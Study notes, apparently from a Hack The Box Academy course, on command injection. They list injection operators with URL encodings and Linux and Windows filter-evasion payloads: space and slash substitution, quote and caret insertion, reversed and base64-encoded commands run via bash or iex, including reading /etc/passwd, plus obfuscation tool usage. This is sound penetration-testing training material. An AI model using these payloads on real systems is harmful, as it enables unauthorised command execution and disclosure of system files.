

## Injection Operators

In general, for basic command injection, all of these operators can be used for command injections `regardless of the web application language, framework, or back-end server`.

Note: The only exception may be the semi-colon `;`, which will not work if the command was being executed with `Windows Command Line (CMD)`, but would still work if it was being executed with `Windows PowerShell`.

However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end. But `input validation should be done both on the front-end and on the back-end`.

|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

 [PayloadsAllTheThings/Command Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) 

---
---


# (1) Linux

## Filtered Character Bypass

### Environment Variables

|Code|Description|
|---|---|
|`printenv`|Can be used to view all environment variables.|

### Bypassing Spaces

|Code|Description|
|---|---|
|`%09`|Using tabs instead of spaces.|
|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`).|
|`{ls,-la}`|Using braces; commas will be replaced with spaces.|

### Creating Other Characters

|Code|Description|
|---|---|
|`${PATH:0:1}`|Will be replaced with `/`.|
|`${LS_COLORS:10:1}`|Will be replaced with `;`. `${LS_COLORS:10:1}` means **“take 1 character starting at position 10 of `LS_COLORS`”**; e.g. if `LS_COLORS=0123456789;abc`, then `${LS_COLORS:10:1}` → `;`.|
|`$(tr '!-}' '"-~'<<<[)`|Shifts a character by one (`[` → `\`). Suppose in the ASCII table `[` is 91 and `\` is 92, so `echo $(tr '!-}' '"-~' <<<[)` → `\`. We are printing the next character after `[` here, so an ASCII table reference is needed for the required character.|

### Example — Combining Techniques

|Example|What it does|
|---|---|
|`127.0.0.1%0a{ls,-la,${IFS},${PATH:0:1}home}`|Combines a newline (`%0a`), brace expansion, `${IFS}`, and `${PATH:0:1}` to construct the command without directly typing the usual spaces and `/`.|

---

## Blacklisted Command Bypass

### Character Insertion

|Code|Description|
|---|---|
|`'` or `"`|We cannot mix types of quotes, and the number of quotes must be even, such as `w"h"o"am"i` or `w'h'o'am'i`.|
|`$@` or `\`|Linux only. The number of characters does not have to be even, and we can insert just one of them if we want to: `who$@ami`, `w\ho\am\i`.|
|`127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`|Uses character insertion (`'`) to break up the blacklisted command `cat`, while `${IFS}` replaces the space and `${PATH:0:1}` provides `/`.|

### Case Manipulation

Linux systems are case-sensitive.

| Code                               | Description                                                                                                   |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Converts uppercase letters to lowercase, allowing the command to be executed regardless of its original case. |
| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the case-manipulation technique. `${a,,}` converts the value of `a` to lowercase.        |

### Reversed Commands

|        | Code                   | Description                                                 |
| ------ | ---------------------- | ----------------------------------------------------------- |
| Step 1 | `echo 'whoami' \| rev` | Reverses a string. Example: `whoami` → `imaohw`.            |
| Step 2 | `$(rev<<<'imaohw')`    | Reverses `imaohw` back to `whoami` and executes the result. |

### Encoded Commands

|        | Code                                                         | Description                                                             |
| ------ | ------------------------------------------------------------ | ----------------------------------------------------------------------- |
| Step 1 | `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encodes the command using Base64.                                       |
| Step 2 | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Decodes the Base64 string and executes the resulting command with Bash. |
Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques  (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

### Automated tool:

A handy tool we can utilize in linux for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator).

| Tool usage                                                               |                                                     |
| ------------------------------------------------------------------------ | --------------------------------------------------- |
| `./bashfuscator -c 'cat /etc/passwd'`                                    |                                                     |
| `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` | to produce a shorter and simpler obfuscated command |
| test the outputted command with `bash -c ''`                             |                                                     |

---
---

# (2) Windows

## Filtered Character Bypass

`%HOMEPATH:~6,-11%` means **start at character 6 and stop 11 characters before the end**, while `%HOMEPATH:~0,1%` means **start at character 0 and take 1 character**; e.g. `%HOMEPATH%=\Users\Administrator\Desktop` → `%HOMEPATH:~6,-11%` = `Administrator`, and `%HOMEPATH:~0,1%` = `\`.

With PowerShell, a word is considered an array, so we have to specify the index of the character we need.

### Environment Variables

|Code|Description|
|---|---|
|`Get-ChildItem Env:`|Can be used to view all environment variables and then try to be creative by specifying what you need (PowerShell).|

### Bypassing Spaces

|Code|Description|
|---|---|
|`%09`|Using tabs instead of spaces.|
|`%PROGRAMFILES:~10,-5%`|Will be replaced with a space (CMD).|
|`$env:PROGRAMFILES[10]`|Will be replaced with a space (PowerShell).|

### Creating Other Characters

|Code|Description|
|---|---|
|`%HOMEPATH:~0,-17%`|Will be replaced with `\` (CMD).|
|`$env:HOMEPATH[0]`|Will be replaced with `\` (PowerShell).|

---

## Blacklisted Command Bypass

### Character Insertion

|Code|Description|
|---|---|
|`'` or `"`|Total number of quotes must be even.|
|`^`|Windows CMD only. Can be inserted between characters to change how the command is parsed.|

### Case Manipulation

| Code     | Description                                                                                                                               |
| -------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `WhoAmi` | Simply use odd/mixed capitalization when the filter checks for an exact lowercase command. Linux systems are case-sensitive, windows not. |

### Reversed Commands

|        | Code                                  | Description                                             |
| ------ | ------------------------------------- | ------------------------------------------------------- |
| Step 1 | `"whoami"[-1..-20] -join ''`          | Reverses a string.                                      |
| Step 2 | `iex "$('imaohw'[-1..-20] -join '')"` | Reverses the string and executes the resulting command. |

### Encoded Commands

|        | Code                                                                                                         | Description                                                       |
| ------ | ------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------- |
| Step 1 | `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                              | Encodes a string using Base64 with PowerShell's Unicode encoding. |
| Step 2 | `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Decodes the Base64 string and executes the resulting command.     |


### Automated tool:

A handy tool we can utilize in linux for obfuscating bash commands is [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation).

|        |                                                          |
| ------ | -------------------------------------------------------- |
| step 1 | `SET COMMAND type C:\Users\htb-student\Desktop\flag.txt` |
| step 2 | `encoding`                                               |
| step 3 | `1`                                                      |
see tutorials.

Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above.

---
---
# Skill Assessment

[Skills Assessment - Command Injections](https://notes.maccgenics.com/02-areas/hack-the-box/htb-academy/bug-bounty-hunter/10-command-injections/skills-assessment-command-injections/) 